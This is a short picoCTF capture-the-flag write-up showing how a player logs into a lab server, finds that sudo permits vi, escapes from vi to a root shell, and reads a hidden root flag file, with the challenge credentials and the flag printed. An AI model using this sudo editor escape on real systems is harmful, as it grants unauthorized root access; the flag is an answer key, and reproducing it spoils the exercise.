## Objetivo 
Can you read files in the root file?

Additional details will be available after launching your challenge instance.

The system admin has provisioned an account for you on the main server: `ssh -p 52644 picoplayer@saturn.picoctf.net` Password: `e3pn6lmvHt` Can you login and read the root file?
## Solución  

```bash 
picoplayer@challenge:~$ sudo -l
[sudo] password for picoplayer: 
Matching Defaults entries for picoplayer on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoplayer may run the following commands on challenge:
    (ALL) /usr/bin/vi
picoplayer@challenge:~$ sudo vi test

root@challenge:/home/picoplayer# whoami
root
root@challenge:/home/picoplayer# ls
root@challenge:/home/picoplayer# cd /root
root@challenge:~# ls
root@challenge:~# cd /root/
root@challenge:~# ls
root@challenge:~# ls -la
total 16
drwx------ 1 root root   22 Sep 14 04:34 .
drwxr-xr-x 1 root root   63 Sep 14 04:25 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   35 Aug  4  2023 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
-rw------- 1 root root  803 Sep 14 04:34 .viminfo
root@challenge:~# cat ./flag.txt
cat: ./flag.txt: No such file or directory
root@challenge:~# cat .flag.txt
picoCTF{uS1ng_v1m_3dit0r_021d10ab}

```

## Notas Adicionales 



### Referencias

